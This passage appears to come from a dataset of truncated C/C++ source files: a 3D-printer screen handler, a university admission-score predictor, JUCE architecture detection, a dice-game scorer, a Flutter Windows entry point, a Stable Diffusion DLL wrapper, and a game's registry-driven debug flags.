dgus_screen_handler.SetStatusMessage(FPSTR(DGUS_MSG_BUSY));\n    return false;\n  }\n\n  if (ExtUI::isPositionKnown()) {\n    if (ExtUI::getAxisPosition_mm(ExtUI::Z) < 4.0f) {\n      queue.enqueue_now(F(\"G0Z4\"));\n    }\n\n    char buffer[20];\n    snprintf_P(buffer, sizeof(buffer), PSTR(\"G0X%dY%d\"), DGUS_LEVEL_CENTER_X, DGUS_LEVEL_CENTER_Y);\n\n    queue.enqueue_one_now(buffer);\n    queue.enqueue_now(F(\"G0Z0\"));\n\n    return true;\n  }\n\n  dgus_screen_handler.SetMessageLinePGM(NUL_STR, 1);\n  dgus_screen_handler.SetMessageLinePGM(DGUS_MSG_HOMING, 2);\n  dgus_screen_handler.SetMessageLinePGM(NUL_STR, 3);\n  dgus_screen_handler.SetMessageLinePGM(NUL_STR, 4);\n  dgus_screen_handler.ShowWaitScreen(DGUS_Screen::LEVELING_OFFSET);\n\n  queue.enqueue_now_P(DGUS_CMD_HOME);\n\n  return false;\n}\n\nbool DGUSSetupHandler::LevelingAutomatic() {\n  if (ExtUI::getLevelingIsValid()) {\n    dgus_screen_handler.leveling_active = true;\n\n    ExtUI::setLevelingActive(true);\n  }\n\n  return true;\n}\n\nbool DGUSSetupHandler::LevelingProbing() {\n  dgus_screen_handler.probing_icons[0] = 0;\n  dgus_screen_handler.probing_icons[1] = 0;\n\n  return true;\n}\n\nbool DGUSSetupHandler::Filament() {\n  dgus_screen_handler.filament_extruder = DGUS_Data::Extruder::CURRENT;\n  dgus_screen_handler.filament_length = DGUS_DEFAULT_FILAMENT_LEN;\n\n  return true;\n}\n\nbool DGUSSetupHandler::Move() {\n  dgus_screen_handler.move_steps = DGUS_Data::StepSize::MM10;\n\n  if (!dgus_screen_handler.IsPrinterIdle()) {\n    dgus_screen_handler.SetStatusMessage(FPSTR(DGUS_MSG_BUSY));\n    return false;\n  }\n\n  return true;\n}\n\nbool DGUSSetupHandler::Gcode() {\n  ZERO(dgus_screen_handler.gcode);\n\n  if (dgus_display.gui_version < 0x30 || dgus_display.os",
    "#include <data.h>\n#include <base.h>\n\nstd::map<int, int> minScoresByYear;\n\nnamespace search {\n    inline double predictScore(int year1, int score1, int year2, int score2, int year3, int score3, int predictYear) {\n        // \u4f7f\u7528\u4e24\u4e24\u5e74\u4efd\u4e4b\u95f4\u7684\u5206\u6570\u53d8\u5316\u8ba1\u7b97\u659c\u7387\uff08delta score / delta year\uff09\n        double slope1 = (double)(score2 - score1) / (year2 - year1);\n        double slope2 = (double)(score3 - score2) / (year3 - year2);\n\n        // \u53d6\u5e73\u5747\u659c\u7387\n        double avgSlope = (slope1 + slope2) / 2.0;\n\n        // \u4f7f\u7528\u7ebf\u6027\u56de\u5f52\u516c\u5f0f y = mx + b \u9884\u6d4b\u5206\u6570\n        // b\uff08\u622a\u8ddd\uff09 = score3 - slope * year3\n        double intercept = score3 - avgSlope * year3;\n\n        // \u9884\u6d4b 2025 \u5e74\u7684\u5206\u6570\n        double predictedScore = avgSlope * predictYear + intercept;\n        return predictedScore;\n    }\n    void search(const std::string& university, const std::string& profession) {\n        bool is985 = false;\n        bool is211 = false;\n        bool found = false;\n\n/*        for (const auto& uni : universityData) {\n            // \u7cbe\u786e\u5339\u914d\u5927\u5b66\u540d\u79f0\u548c\u4e13\u4e1a\n            if (uni.name == university && uni.profession == profession) {\n            // \u8fc7\u6ee4\u5e74\u4efd\u57282022-2024\u4e4b\u95f4\n                if (uni.year >= 2022 && uni.year <= 2024) {\n                    found = true;\n                    is985 = uni.is985;\n                    is211 = uni.is211;\n                    if (uni.score != \"null\" && !uni.score.empty()) {\n                        int scoreInt = std::stoi(uni.score);  // \u8f6c\u6362 score \u4e3a int\n\n                        // \u66f4\u65b0\u6bcf\u5e74\u7684\u6700\u4f4e\u6295\u6863\u7ebf\n                        if (minScoresByYear.find(uni.year) == minScoresByYear.end() || scoreInt < minScoresByYear[uni.year]) {\n                            minScoresByYear[uni.year] = scoreInt;\n                        }\n                    }\n                }\n            }\n        }\n*/\n        for (const auto& uni : universityData) {\n            if (uni.name == university && uni.profession == profession) {\n                if (uni.year >= 2022 && uni.year <= 2024) {\n                    found = true;\n                    is985 = uni.is985;\n                    is211 = uni.is211;\n\n                    if (uni.score != \"null\" && !uni.score.empty()) {\n                        int scoreInt = std::stoi(uni.score);\n                        if (minScoresByYear.find(uni.year) == minScoresByYear.end() || scoreInt < minScoresByYear[uni.year]) {\n                            minScoresByYear[uni.year] = scoreInt;\n                        }\n                    }\n                }\n            }\n        }\n        // \u8f93\u51fa\u6bcf\u5e74\u7684\u6700\u4f4e\u6295\u6863\u7ebf\n        if (found) {\n            std::cout << university << profession << \"2022-2024\u5e74\u6700\u4f4e\u6295\u6863\u5206:\" << std::endl;\n            int totalScore = 0;  // \u7528\u4e8e\u8ba1\u7b97\u603b\u5206\n            int count = 0;\n            for (int year = 2022; year <= 2024; ++year) {\n                std::cout << \"Year \" << year << \": \";\n                auto it = minScoresByYear.find(year);\n                if (it != minScoresByYear.end()) {\n                    //std::cout << it->second << std::endl;\n                    totalScore += it->second;  // \u7d2f\u52a0\u5206\u6570\n                    ++count;\n                    auto it = minScoresByYear.find(year);\n                    std::cout << it->second << std::endl;\n                } else {\n                    std::cout << \"No data\" << std::endl;\n                }\n            }\n\n            if (count == 3) {\n                // double averageScore = static_cast<double>(totalScore) / count;\n                double averageScore = static_cast<double>(totalScore) / count;\n                int roundedAverageScore = static_cast<int>(std::ceil(averageScore));  // \u5411\u4e0a\u53d6\u6574\n                std::cout << \"\u8fd1\u4e09\u5e74\u5e73\u5747\u5206(\u5411\u4e0a\u53d6\u6574):\" << roundedAverageScore << std::endl;\n            } else {\n                std::cout << \"\u65e0\u6cd5\u8ba1\u7b97\u4e09\u5e74\u5e73\u5747\u5206\uff0c\u6570\u636e\u4e0d\u8db3\u3002\" << std::endl;\n            }\n\n            if (minScoresByYear.size() == 3) {\n                int score2022 = minScoresByYear[2022];\n                int score2023 = minScoresByYear[2023];\n                int score2024 = minScoresByYear[2024];\n\n                // \u9884\u6d4b 2025 \u5e74\u7684\u5206\u6570\u7ebf\n                double predictedScore = predictScore(2022, score2022, 2023, score2023, 2024, score2024, 2025);\n                std::cout << \"Year 2025 (\u4ec5\u4f9b\u53c2\u8003): \" << predictedScore << std::endl;\n\n            } else {\n                std::cout << \"\u6570\u636e\u4e0d\u8db3\u3002\" << std::endl;\n                exit(2);\n            }\n\n            std::cout << \"\\n\u8be5\u5b66\u6821\u662f\";\n            if (is985) {\n                std::cout << \" 985 \";\n            }\n            if (is211) {\n                std::cout << \" 211 \";\n            }\n            if (!is985 && !is211) {\n                std::cout << \" \u975e 985/211 \";\n            }\n            std::cout << \"\u5927\u5b66\u3002\" << std::endl;\n\n        } else {\n            std::cout << \"\u6ca1\u6709\u627e\u5230\u5339\u914d\u7684\u5927\u5b66\u6216\u4e13\u4e1a\u3002\" << std::endl;\n            exit(1);\n        }\n    }\n\n    void listProfessions(const std::string& university, std::vector<std::string>& professions) {\n        for (const auto& uni : universityData) {\n            if (uni.name == university) {\n                if (std::find(professions.begin(), professions.end(), uni.profession) == professions.end()) {\n               ",
    "/*\r\n  ==============================================================================\r\n\r\n   This file is part of the JUCE library.\r\n   Copyright (c) 2022 - Raw Material Software Limited\r\n\r\n   JUCE is an open source library subject to commercial or open-source\r\n   licensing.\r\n\r\n   By using JUCE, you agree to the terms of both the JUCE 7 End-User License\r\n   Agreement and JUCE Privacy Policy.\r\n\r\n   End User License Agreement: www.juce.com/juce-7-licence\r\n   Privacy Policy: www.juce.com/juce-privacy-policy\r\n\r\n   Or: You may also use this code under the terms of the GPL v3 (see\r\n   www.gnu.org/licenses).\r\n\r\n   JUCE IS PROVIDED \"AS IS\" WITHOUT ANY WARRANTY, AND ALL WARRANTIES, WHETHER\r\n   EXPRESSED OR IMPLIED, INCLUDING MERCHANTABILITY AND FITNESS FOR PURPOSE, ARE\r\n   DISCLAIMED.\r\n\r\n  ==============================================================================\r\n*/\r\n\r\n#if defined(__arm__) || defined(__TARGET_ARCH_ARM) || defined(_M_ARM) || defined(_M_ARM64) || defined(__aarch64__) || defined(__ARM64__)\r\n\r\n  #if defined(_M_ARM64) || defined(__aarch64__) || defined(__ARM64__)\r\n    #error JUCE_ARCH aarch64\r\n  #elif (defined(__TARGET_ARCH_ARM) && __TARGET_ARCH_ARM == 8) || defined(__ARMv8__) || defined(__ARMv8_A__)\r\n    #error JUCE_ARCH armv8l\r\n  #elif (defined(__TARGET_ARCH_ARM) && __TARGET_ARCH_ARM == 7) || defined(__ARM_ARCH_7__) || defined(__ARM_ARCH_7A__) || defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7M__) || defined(__ARM_ARCH_7S__) || defined(_ARM_ARCH_7) || defined(__CORE_CORTEXA__)\r\n    #error JUCE_ARCH armv7l\r\n  #elif (defined(__TARGET_ARCH_ARM) && __TARGET_ARCH_ARM == 6) || defined(__ARM_ARCH_6__) || defined(__ARM_ARCH_6J__) || defined(__ARM_ARCH_6T2__) || defined(__ARM_ARCH_6Z__) || defined(__ARM_ARCH_6K__) || defined(__ARM_ARCH_6ZK__) || defined(__ARM_ARCH_6M__)\r\n    #error JUCE_ARCH armv6l\r\n  #elif (defined(__TARGET_ARCH_ARM) && __TARGET_ARCH_ARM == 5) || defined(__ARM_ARCH_5TEJ__)\r\n    #error JUCE_ARCH armv5l\r\n  #else\r\n    #error JUCE_ARCH arm\r\n  #endif\r\n\r\n#elif defined(__i386) || defined(__i386__) || defined(_M_IX86)\r\n\r\n  #error JUCE_ARCH i386\r\n\r\n#elif defined(__x86_64) || defined(__x86_64__) || defined(__amd64) || defined(_M_X64)\r\n\r\n  #error JUCE_ARCH x86_64\r\n\r\n#elif defined(__ia64) || defined(__ia64__) || defined(_M_IA64)\r\n\r\n  #error JUCE_ARCH ia64\r\n\r\n#elif defined(__mips) || defined(__mips__) || defined(_M_MRX000)\r\n\r\n  #if defined(_MIPS_ARCH_MIPS64) || defined(__mips64)\r\n    #error JUCE_ARCH mips64\r\n  #else\r\n    #error JUCE_ARCH mips\r\n  #endif\r\n\r\n#elif defined(__ppc__) || defined(__ppc) || defined(__powerpc__) || defined(_ARCH_COM) || defined(_ARCH_PWR) || defined(_ARCH_PPC) || defined(_M_MPPC) || defined(_M_PPC)\r\n\r\n  #if defined(__ppc64__) || defined(__powerpc64__) || defined(__64BIT__)\r\n    #error JUCE_ARCH ppc64\r\n  #else\r\n    #error JUCE_ARCH ppc\r\n  #endif\r\n\r\n#elif defined(__riscv)\r\n\r\n  #if __riscv_xlen == 64\r\n    #error JUCE_ARCH riscv64\r\n  #else\r\n    #error JUCE_ARCH riscv\r\n  #endif\r\n\r\n#else\r\n\r\n  #error JUCE_ARCH unknown\r\n\r\n#endif\r\n",
    "/******************************************************************\r\n*   Authors:    Gage Jones, Mason Dye\r\n*   Date:       Sunday, August 1st, 2021\r\n*   Version:    1.6\r\n*   Title:      QuickFunctions.cpp\r\n*   Purpose:    Holds a few functions required for Quick Mode\r\n******************************************************************/\r\n\r\n#include \"Gwent.h\"\r\n\r\n\r\n\r\nvoid GameScore::autoWinValidation()\r\n{\r\n    // End of Round 1:\r\n    if (r1Winner == 0)\r\n    {\r\n        // Checks for if there is a tie, in which case the player will reroll their D12\r\n        while(round1.player1.finalScore == round1.player2.finalScore)\r\n        {\r\n            round1.player1.qReRoll();\r\n            round1.player1.finalScore = round1.player1.d12 + round1.player1.dieNum;\r\n        }\r\n\r\n        if (round1.player1.finalScore > round1.player2.finalScore)\r\n        {\r\n            cout << \"Validating Round Winner...\\n\";\r\n            elipAnim();\r\n            winCountP1++;\r\n            lossCountP2++;\r\n            r1Winner = 1;\r\n        }\r\n        else if (round1.player1.finalScore < round1.player2.finalScore)\r\n        {\r\n            cout << \"Validating Round Winner...\\n\";\r\n            elipAnim();\r\n            lossCountP1++;\r\n            winCountP2++;\r\n            r1Winner = 2;\r\n        }\r\n    }\r\n    \r\n    // End of Round 2:\r\n    else if (r2Winner == 0)\r\n    {\r\n        // Checks for if there is a tie, in which case the player will reroll their D12\r\n        while(round2.player1.finalScore == round2.player2.finalScore)\r\n        {\r\n            round2.player1.qReRoll();\r\n            round2.player1.finalScore = round2.player1.d12 + round2.player1.dieNum;\r\n        }\r\n\r\n        if ((round2.player1.finalScore > round2.player2.finalScore) && winCountP1 == 1)\r\n        {\r\n            cout << \"Validating Round Winner...\\n\";\r\n            elipAnim();\r\n            cout << \"Validating Game Winner...\\n\";\r\n            elipAnim();\r\n            autoScore();\r\n            cout << \"\\n\\nPlayer 1 won!\\n\";\r\n            pressAnyKeyToContinue();\r\n            winCountP1++;\r\n            lossCountP2++;\r\n            r2Winner = 1;\r\n            gameWinner = 1;\r\n        }\r\n        else if (round2.player1.finalScore > round2.player2.finalScore)\r\n        {\r\n            cout << \"Validating Round Winner...\\n\";\r\n            elipAnim();\r\n            winCountP1++;\r\n            lossCountP2++;\r\n            r2Winner = 1;\r\n        }\r\n        else if ((round2.player1.finalScore < round2.player2.finalScore) && lossCountP1 == 1)\r\n        {\r\n            cout << \"Validating Round Winner...\\n\";\r\n            elipAnim();\r\n            cout << \"Validating Game Winner...\\n\";\r\n            elipAnim();\r\n            autoScore();\r\n            cout << \"\\n\\nPlayer 2 won!\\n\";\r\n            pressAnyKeyToContinue();\r\n            lossCountP1++;\r\n            winCountP2++;\r\n            r2Winner = 2;\r\n            gameWinner = 2;\r\n        }\r\n        else if (round2.player1.finalScore < round2.player2.finalScore)\r\n        {\r\n            cout << \"Validating Round Winner...\\n\";\r\n            elipAnim();\r\n            lossCountP1++;\r\n            winCountP2++;\r\n            r2Winner = 2;\r\n        }\r\n    }\r\n    \r\n    // End of Round 3:\r\n    else if (r3Winner == 0)\r\n    {\r\n        // Checks for if there is a tie, in which case the player will reroll their D12\r\n        while(round3.player1.finalScore == round3.player2.finalScore)\r\n        {\r\n            round3.player1.qReRoll();\r\n            round3.player1.finalScore = round3.player1.d12 + round3.player1.dieNum;\r\n        }\r\n\r\n        if (round3.player1.finalScore > round3.player2.finalScore)\r\n        {\r\n            cout << \"Validating Round Winner...\\n\";\r\n            elipAnim();\r\n            cout << \"Validating Game Winner...\\n\";\r\n            elipAnim();\r\n            autoScore();\r\n            cout << \"\\n\\nPlayer 1 won!\\n\";\r\n            pressAnyKeyToContinue();\r\n            winCountP1++;\r\n            lossCountP2++;\r\n            r3Winner = 1;\r\n            gameWinner = 1;\r\n        }\r\n        \r\n        else if (round3.player1.finalScore < round3.player2.finalScore)\r\n        {\r\n            cout << \"Validating Round Winner...\\n\";\r\n            elipAnim();\r\n            cout << \"Validating Game Winner...\\n\";\r\n            elipAnim();\r\n            autoScore();\r\n            cout << \"\\n\\nPlayer 2 won!\\n\";\r\n            pressAnyKeyToContinue();\r\n            lossCountP1++;\r\n            winCountP1++;\r\n            r3Winner = 2;\r\n            gameWinner = 2;\r\n        }\r\n    }\r\n}\r\n\r\nvoid Player::qReRoll()\r\n{\r\n    // \"Rolls the die\", sets d12 roll to random number 1-12:\r\n    d12 = (rand() %12) + 1;\r\n}\r\n\r\n\r\nvoid GameScore::autoScore()\r\n{\r\n    cout << \"                                  ___________________________________________________\\n\"\r\n         << \"                                 |         |      Player 1     |     Player 2          \\n\"\r\n         << \"                                 | Round 1 |     \" << round1.player1.d12 << \" + \" << round1.player1.dieNum << \" = \" << round1.player1.finalScore",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"challange\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/**\n * @file StableDiffusion.cpp\n * @author \u9752\u732b (AonekoSS)\n * @brief stable-diffusion.cpp\u306eDLL\u3092\u547c\u3076\u305f\u3081\u306e\u30e9\u30c3\u30d1\u30fc\n */\n#include \"pch.h\"\n\n#include \"SDPlugin.h\"\n#include \"StableDiffusion.h\"\n\nnamespace StableDiffusion {\n\t/// @brief DLL\u306e\u30e2\u30b8\u30e5\u30fc\u30eb\u30cf\u30f3\u30c9\u30eb\n\tstatic HMODULE hModule;\n\n\t// DLL\u5404\u95a2\u6570\u306e\u30dd\u30a4\u30f3\u30bf\n#define DECL_FUNCTION(function) static decltype(::function)* function\n\n\tDECL_FUNCTION(new_sd_ctx);\n\tDECL_FUNCTION(free_sd_ctx);\n\tDECL_FUNCTION(img2img);\n\tDECL_FUNCTION(txt2img);\n\tDECL_FUNCTION(get_num_physical_cores);\n\tDECL_FUNCTION(sd_type_name);\n\tDECL_FUNCTION(sd_set_log_callback);\n\tDECL_FUNCTION(sd_set_progress_callback);\n\n#define BIND_FUNCTION(function)  function=reinterpret_cast<decltype(function)>(GetProcAddress(hModule, #function))\n\n\t/// \u30e9\u30a4\u30d6\u30e9\u30ea\u521d\u671f\u5316\n\t/// @param base_path DLL\u3092\u63a2\u3057\u306b\u884c\u304f\u30d9\u30fc\u30b9\u30d1\u30b9\n\tvoid Initialize(std::string const& base_path) {\n\t\tif (hModule != NULL) return;\n\n\t\t// DLL\u306e\u30ed\u30fc\u30c9\n\t\tauto dll_path = base_path + \"stable-diffusion.dll\";\n\t\tprint(\"LoadLibrary: %s\", dll_path.c_str());\n\t\thModule = LoadLibraryA(dll_path.c_str());\n\t\tif (hModule == NULL) {\n\t\t\tprint(\"LoadLibrary: error\");\n\t\t\treturn;\n\t\t}\n\n\t\t// \u5404\u95a2\u6570\u306e\u30d0\u30a4\u30f3\u30c7\u30a3\u30f3\u30b0\n\t\tBIND_FUNCTION(new_sd_ctx);\n\t\tBIND_FUNCTION(free_sd_ctx);\n\t\tBIND_FUNCTION(img2img);\n\t\tBIND_FUNCTION(txt2img);\n\t\tBIND_FUNCTION(get_num_physical_cores);\n\t\tBIND_FUNCTION(sd_type_name);\n\t\tBIND_FUNCTION(sd_set_log_callback);\n\t\tBIND_FUNCTION(sd_set_progress_callback);\n\t}\n\n\t/// \u30e9\u30a4\u30d6\u30e9\u30ea\u89e3\u653e\n\tvoid Terminate() {\n\t\tif (hModule != NULL) FreeLibrary(hModule);\n\t\thModule = NULL;\n\t}\n\n\t/// \u30ed\u30b0\u7528\u30b3\u30fc\u30eb\u30d0\u30c3\u30af\n\tstatic void log_callback(enum sd_log_level_t level, const char* log, void* data) {\n\t\tParams* params = (Params*)data;\n\t\tif (!log || !params || (!params->verbose && level <= SD_LOG_DEBUG)) return;\n\t\tconst char* level_name = \"????\";\n\t\tswitch (level) {\n\t\tcase SD_LOG_DEBUG: level_name = \"DEBUG\"; break;\n\t\tcase SD_LOG_INFO:  level_name = \"INFO\";  break;\n\t\tcase SD_LOG_WARN:  level_name = \"WARN\";  break;\n\t\tcase SD_LOG_ERROR: level_name = \"ERROR\"; break;\n\t\t}\n\t\tprint(\"[%-5s] %s\", level_name, log);\n\t}\n\n\t// ini\u30d5\u30a1\u30a4\u30eb\u8aad\u307f\u8fbc\u307f\u30d8\u30eb\u30d1\u30fc\uff08\u6587\u5b57\u5217\u7528\uff09\n\tstatic std::string iniGetString(const std::string& filePath, const std::string& section, const std::string& key){\n\t\tchar buf[MAX_PATH] = {};\n\t\tGetPrivateProfileStringA(section.c_str(), key.c_str(), \"\", buf, MAX_PATH, filePath.c_str());\n\t\tauto text = std::string(buf);\n\n\t\t// \u30b3\u30e1\u30f3\u30c8\u524a\u9664\n\t\tauto commentPos = text.find_first_of(\"#;\");\n\t\tif (commentPos != std::string::npos) {\n\t\t\ttext.erase(commentPos);\n\t\t}\n\n\t\t// \u30a2\u30f3\u30af\u30a9\u30fc\u30c8\n\t\tif (text.length() >= 2 && text.front() == '\"' && text.back() == '\"') {\n\t\t\ttext = text.substr(1, text.length() - 2);\n\t\t}\n\t\treturn text;\n\t}\n\n\t// ini\u30d5\u30a1\u30a4\u30eb\u8aad\u307f\u8fbc\u307f\uff1a\u6587\u5b57\u5217\n\tstatic void ini(const std::string& filePath, const std::string& section, const std::string& key, std::string& val){\n\t\tauto s = iniGetString(filePath, section, key);\n\t\tif (!s.empty()) val = s;\n\t}\n\t// ini\u30d5\u30a1\u30a4\u30eb\u8aad\u307f\u8fbc\u307f\uff1a\u6574\u6570\n\tstatic void ini(const std::string& filePath, const std::string& section, const std::string& key, int& val){\n\t\tauto s = iniGetString(filePath, section, key);\n\t\tif (!s.empty()) val = std::stoi(s);\n\t}\n\t// ini\u30d5\u30a1\u30a4\u30eb\u8aad\u307f\u8fbc\u307f\uff1a\u5c0f\u6570\n\tstatic void ini(const std::string& filePath, const std::string& section, const std::string& key, float& val){\n\t\tauto s = iniGetString(filePath, section, key);\n\t\tif (!s.empty()) val = std::stof(s);\n\t}\n\t// ini\u30d5\u30a1\u30a4\u30eb\u8aad\u307f\u8fbc\u307f\uff1aint64_t\uff08seed\u7528\uff09\n\tstatic void ini(const std::string& filePath, const std::string& section, const std::string& key, int64_t& val){\n\t\tauto s = iniGetString(filePath, section, key);\n\t\tif (!s.empty()) val = std::stoll(s);\n\t}\n\t// ini\u30d5\u30a1\u30a4\u30eb\u8aad\u307f\u8fbc\u307f\uff1abool\n\tstatic void ini(const std::string& filePath, const std::string& section, const std::string& key, bool& val){\n\t\tauto s = iniGetString(filePath, section, key);\n\t\tif (s == \"true\") val = true; else if (s == \"false\") val = false;\n\t}\n\t// ini\u30d5\u30a1\u30a4\u30eb\u8aad\u307f\u8fbc\u307f\uff1asample_method_t\n\tstatic void ini(const std::string& filePath, const std::string& section, const std::string& key, sample_method_t& val){\n\t\tauto s = iniGetString(filePath, section, key);\n\t\tif (s.empty()) return;\n\t\telse if (s == \"euler_a\") val = EULER_A;\n\t\telse if (s == \"euler\") val = EULER;\n\t\telse if (s == \"heun\") val = HEUN;\n\t\telse if (s == \"dpm2\") val = DPM2;\n\t\telse if (s == \"dpm++2s_a\") val = DPMPP2S_A;\n\t\telse if (s == \"dpm++2m\") val = DPMPP2M;\n\t\telse if (s == \"dpm++2mv2\") val = DPMPP2Mv2;\n\t\telse if (s == \"ipndm\") val = IPNDM;\n\t\telse if (s == \"ipndm_v\") val = IPNDM_V;\n\t\telse if (s == \"lcm\") val = LCM;\n\t}\n\t// ini\u30d5\u30a1\u30a4\u30eb\u8aad\u307f\u8fbc\u307f\uff1aschedule_t\n\tstatic void ini(const std::string& filePath, const std::string& section, const std::string& key, schedule_t& val){\n\t\tauto s = iniGetString(filePath, section, key);\n\t\tif (s.empty()) return;\n\t\telse if (s == \"default\") val = DEFAULT;\n\t\telse if (s == \"discrete\") val = DISCRETE;\n\t\telse if (s == \"karras\") val = KARRAS;\n\t\telse if (s == \"exponential\") val = EXPONENTIAL;\n\t\telse if (s == \"ays\") val = AYS;\n\t\telse if (s == \"gits\") val = GITS;\n\t}\n\n\t/// \u8a2d\u5b9a\u306e\u30ed\u30fc\u30c9\n\t/// @param file \u8a2d\u5b9a\u30d5\u30a1\u30a4\u30eb\u306e\u30d1\u30b9\n\t/// @param section \u30bb\u30af\u30b7\u30e7\u30f3\n\t/// @return \u8a2d\u5b9a\u30c7\u30fc\u30bf\n\tParams LoadParams(const std::string& filePath, const std::string& section, const Params& defaultParams){\n\t\tParams p = defau",
    "#include \"debug.hpp\"\n#include \"registry.hpp\"\n#include <stdio.h>\n\nbool gDo_infinite_lives_67D4C9;\nbool bLimit_recycling_67D4CA;\nbool bDo_invulnerable_67D4CB;\nbool bLog_input_67D4CC;\nbool bSkip_right_67D4E4;\nbool bSkip_mission_67D4E5;\nbool bLog_collisions_67D4E6;\nbool bSkip_bottom_67D4E7;\nbool bSkip_quit_confirm_67D4E8;\nbool bDo_iain_test_67D4E9;\nbool bSkip_draw_67D4EA;\nbool bDo_release_replay_67D4EB;\nbool bSkip_traffic_lights_67D4EC;\nbool byte_67D4ED;\nbool bDo_corner_window_67D4EE;\nbool bSkip_dummies_67D4EF;\nbool bDo_load_savegame_67D4F0;\nbool byte_67D4F1;\nbool bDo_show_horn_67D4F2;\nbool bIgnore_replay_header_67D4F3;\nbool bPlay_replay_67D4F4;\nbool bDont_get_car_back_67D4F5;\nbool byte_67D4F6;\nbool byte_67D4F7;\nbool bDo_test_67D4F8;\nbool bSkip_police_67D4F9;\nbool bDo_show_traffic_lights_info_67D4FA;\nbool bExplodingOff_67D4FB;\nbool bShow_brief_number_67D504;\nbool bSkip_slopes_67D505;\nbool bSkip_user_67D506;\nbool bSkip_fire_engines_67D53A;\nbool bSkip_frontend_67D53B;\nbool bIsFrench_67D53C;\nbool bDo_brian_test_67D544;\nbool bSkip_lid_67D546;\nbool bShow_player_names_67D54C;\nbool bKeep_weapons_after_death_67D54D;\nbool bSkip_window_check_67D54E;\nbool bDo_show_physics_67D54F;\nbool bSkip_trains_67D550;\nbool bSkip_buses_67D558;\nbool bDo_show_ids_67D559;\nbool bDo_police_1_67D568;\nbool bDo_police_2_67D569;\nbool bDo_police_3_67D56A;\nbool bSkip_top_67D574;\nbool bSkip_recycling_67D575;\nbool gDo_show_input_67D576;\nbool bSkip_skidmarks_67D585;\nbool bNo_annoying_chars_67D586;\nbool bDo_show_imaginary_67D588;\nbool bDo_show_camera_67D58A;\nbool bSkip_replay_sync_check_67D594;\nbool bDo_show_junc_ids_67D5B0;\nbool bLog_random_extra_67D5BC;\nbool bConstant_replay_save_67D5C4;\nbool bDo_blood_67D5C5;\nbool bDo_mike_67D5CC;\nbool bShow_hidden_faces_67D5CD;\nbool bLog_random_67D5FC;\nbool bDo_show_instruments_67D64C;\nbool bSkip_particles_67D64D;\nbool bSkip_tiles_67D655;\nbool bGet_all_weapons_67D684;\nbool gDo_miss_logging_67D6BC;\nbool gShow_cycle_67D6BD;\nbool bSkip_audio_67D6BE;\nbool bSkip_left_67D6BF;\nbool bLog_directinput_67D6C0;\nbool bDo_sync_check_67D6C1;\nbool bDo_3d_sound_67D6C2;\nbool bSkip_ambulance_67D6C9;\nbool bDo_show_object_ids_67D6CA;\nbool bDo_free_shopping_67D6CD;\nbool bDo_debug_keys_67D6CF;\nbool gDo_text_id_test_67D6D0;\nbool bLog_routefinder_67D6D1;\nbool bDo_show_timing_67D6DC;\nbool bDo_exit_after_replay_67D6E4;\nbool bDo_show_collision_box_67D6E5;\nbool gDo_show_counter_67D6E6;\nbool bShow_all_arrows_67D6E7;\nbool bDo_kill_phones_on_answer_67D6E8;\n\n// match\nvoid Debug::Init_4ABBD0()\n{\n    bPlay_replay_67D4F4 = gRegistry_6FF968.Get_Debug_Setting_586E20(\"play_replay\");\n    bConstant_replay_save_67D5C4 = gRegistry_6FF968.Get_Debug_Setting_586E20(\"constant_replay_save\");\n    bSkip_dummies_67D4EF = gRegistry_6FF968.Get_Debug_Setting_586E20(\"skip_dummies\");\n    bDo_test_67D4F8 = gRegistry_6FF968.Get_Debug_Setting_586E20(\"do_test\");\n    bSkip_mission_67D4E5 = gRegistry_6FF968.Get_Debug_Setting_586E20(\"skip_mission\");\n    gShow_cycle_67D6BD = gRegistry_6FF968.Get_Debug_Setting_586E20(\"show_cycle\");\n    bDo_brian_test_67D544 = gRegistry_6FF968.Get_Debug_Setting_586E20(\"do_brian_test\");\n    bDo_iain_test_67D4E9 = gRegistry_6FF968.Get_Debug_Setting_586E20(\"do_iain_test\");\n    bSkip_tiles_67D655 = gRegistry_6FF968.Get_Debug_Setting_586E20(\"skip_tiles\");\n    gDo_show_counter_67D6E6 = gRegistry_6FF968.Get_Debug_Setting_586E20(\"do_show_counters\");\n    bDo_show_camera_67D58A = gRegistry_6FF968.Get_Debug_Setting_586E20(\"do_show_camera\");\n    gDo_show_input_67D576 = gRegistry_6FF968.Get_Debug_Setting_586E20(\"do_show_input\");\n    bDo_show_timing_67D6DC = gRegistry_6FF968.Get_Debug_Setting_586E20(\"do_show_timing\");\n    bDo_show_collision_box_67D6E5 = gRegistry_6FF968.Get_Debug_Setting_586E20(\"do_show_collision_box\");\n    bDo_show_physics_67D54F = gRegistry_6FF968.Get_Debug_Setting_586E20(\"do_show_physics\");\n    bDo_show_imaginary_67D588 = gRegistry_6FF968.Get_Debug_Setting_586E20(\"do_show_imaginary\");\n    bSkip_user_67D506 = gRegistry_6FF968.Get_Debug_Setting_586E20(\"skip_user\");\n    bSkip_traffic_lights_67D4EC = gRegistry_6FF968.Get_Debug_Setting_586E20(\"skip_traffic_lights\");\n    bSkip_recycling_67D575 = gRegistry_6FF968.Get_Debug_Setting_586E20(\"skip_recycling\");\n    bLog_collisions_67D4E6 = gRegistry_6FF968.Get_Debug_Setting_586E20(\"log_collisions\");\n    bDo_show_traffic_lights_info_67D4FA = gRegistry_6FF968.Get_Debug_Setting_586E20(\"do_show_traffic_lights_info\");\n   